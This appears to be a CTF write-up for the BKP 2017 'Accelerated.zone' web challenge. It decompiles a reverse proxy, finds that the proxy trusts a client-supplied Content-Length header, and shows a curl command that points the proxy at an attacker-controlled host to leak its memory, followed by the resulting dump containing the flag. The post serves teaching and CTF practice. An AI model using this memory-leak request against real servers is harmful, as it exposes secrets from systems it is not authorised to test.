+++
date = "2017-02-26T21:39:54-08:00"
title = "BKP 2017 - Accelerated.zone"
tags = ["CTF", "Web"]
+++

Bleeding again.

<!--more-->

# Problem
We were given a reverse proxy at http://accelerated.zone:8000 and the [binary][1] behind it.  It responds with
`Get better cookies bro` if we send a plain GET request to it.  Looks like it expects some secret cookies.  Trying to
access random pages reveals the actual web server was running at port 7733.  Nothing interesting at this point.  Let's
look at the binary file instead.

Open the binary using IDA we can see it uses [libmicrohttpd][2] to serve incoming HTTP requests and [libcurl][3] to
communicate with actual web server.  The two functions that we are interested are `handle_request` and `make_request`.

In `handle_request`, it reads some properties from incoming HTTP request, and passed them to `make_request`.

```
......
  LODWORD(v9) = MHD_get_connection_info(a3, 2LL);
  v22 = *(_QWORD *)v9;
  inet_ntop(2, (const void *)(*(_QWORD *)v9 + 4LL), &buf, 0x10u);
  LODWORD(v10) = MHD_lookup_connection_value(a3, 1LL, "Host");
  host = v10;
  if ( *a5 != &dummy_6361 )
    _printf_chk(1LL, "[%s:%d] %s %s %s %s\n", &buf, *(_WORD *)(v22 + 2), method, a3a);
  if ( strcmp(method, "GET") || (result = strcmp(method, "POST")) != 0 )
  {
    if ( *a5 == &dummy_6361 )
    {
      if ( !strcmp(method, "POST") )
      {
        LODWORD(v13) = MHD_lookup_connection_value(a3, 1LL, "Content-Length");
        length = atol(v13);
      }
      else
      {
        v6 = 0LL;
        length = 0;
      }
      LODWORD(v15) = MHD_lookup_connection_value(a3, 1LL, "Cookie");
      cookies = v15;
      a7 = 500LL;
      MHD_suspend_connection(a3);
      v17 = method;
      v18 = make_request(host, method, a3a, v6, length, cookies, &a7);
      MHD_resume_connection(v7, v17);
      v19 = MHD_queue_response(v7, (unsigned int)a7, v18);
      MHD_destroy_response(v18);
      result = v19;
    }
    else
    {
      *a5 = &dummy_6361;
      result = 1;
    }
  }
......
```

In `make_request`, it constructs curl request using data from incoming request.

```
......
  v11 = open_memstream(&bufloc, &sizeloc);
  LODWORD(v12) = curl_easy_init(&bufloc, &sizeloc);
  v13 = v12;
  curl_easy_setopt(v12, 10002LL, ((unsigned __int64)&v23 + 7) & 0xFFFFFFFFFFFFFFF0LL);// set host
  curl_easy_setopt(v13, 181LL, 1LL);            // protocol=1 (http only)
  curl_easy_setopt(v13, 10001LL, v11);          // output (FILE* or void*)
  curl_easy_setopt(v13, 13LL, 5LL);             // timeout = 5s
  curl_easy_setopt(v13, 3LL, 7733LL);           // port = 7733
  if ( v7 )
  {
    curl_easy_setopt(v13, 10015LL, v7);         // post static input fields
    curl_easy_setopt(v13, 60LL, v22);           // size of post data
  }
  if ( v8 )
    curl_easy_setopt(v13, 10022LL, v8);         // set cookie
  v14 = curl_easy_perform(v13);
  fclose(v11);
  if ( v14 )
  {
    LODWORD(v15) = curl_easy_strerror((unsigned int)v14);
    _fprintf_chk(stderr, 1LL, "curl_easy_perform() failed: %s\n", v15);
    *v23 = 500LL;
    LODWORD(v16) = MHD_create_response_from_buffer(
                     54LL,
                     (__int64)"<html><title>Error!</title><h1>Error! Bad!</h1></html>",
                     0LL);
    v17 = "text/html";
    v18 = v16;
LABEL_8:
    MHD_add_response_header(v18, "Content-Type", v17);
    goto LABEL_9;
  }
  curl_easy_getinfo_err_long();
  curl_easy_getinfo((__int64)v13, 0x200002LL, (__int64)&v23);// get response code
  LODWORD(v19) = MHD_create_response_from_buffer(sizeloc, (__int64)bufloc, 1LL);
......
```

The first attempt we tried was to ask the proxy to access a page that will redirect to a `file://` URI, so that
we might be able to access files in the proxy server.  However, it didn't work.  It turns out for the redirection to work,
we need `CURLOPT_FOLLOWLOCATION` and correct `CURLOPT_REDIR_PROTOCOLS`.  `file://` protocol was by default disabled for
security reasons.

The other thing that caught my eyes was that the proxy reads `Content-Length` header and used that value as the data size
in the curl request.  That means I can fake a large `Content-Length` to the proxy, it will send me a bunch of data in the
post request, which potentially contains senstive information.  This is similar to [SSL Heartbleed][4], and recent
[Cloudbleed][5][^1].

```
curl -H 'Host: server-that-i-control' -H 'Content-Length: 123456' \
  --data 'a=a' http://accelerated.zone:8000
```

That was it.  I got the flag after sending several requests and eyeballed request dump for flag string.

```
$ strings postdata.bin 
a=a
/q?erjg
HTTP/1.1 200 OK
Date: Sat, 25 Feb 2017 23:42:56 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.0.16
Content-Length: 63
Content-Type: text/html; charset=UTF-8
FLAG{ISwearIWroteThisChallengeWeeksAgo}Get better cookies bro.  # Here you are!
HTTP
HTTP
a-certif5
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs
ed.zone:%
http://54.200.59.30/
rcmd
HTTP
HTTP
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs
obHN&nU?
>a2U0*
HTTP/1.1 100 Continue
```

[1]: /bkp-2017/acc_zone_release.tgz
[2]: https://www.gnu.org/software/libmicrohttpd/manual/html_node/index.html#SEC_Contents
[3]: https://curl.haxx.se/libcurl/
[4]: https://en.wikipedia.org/wiki/Heartbleed
[5]: https://en.wikipedia.org/wiki/Cloudbleed


[^1]: As you can see from the flag, the author wrote this challenge before Cloudbleed :).
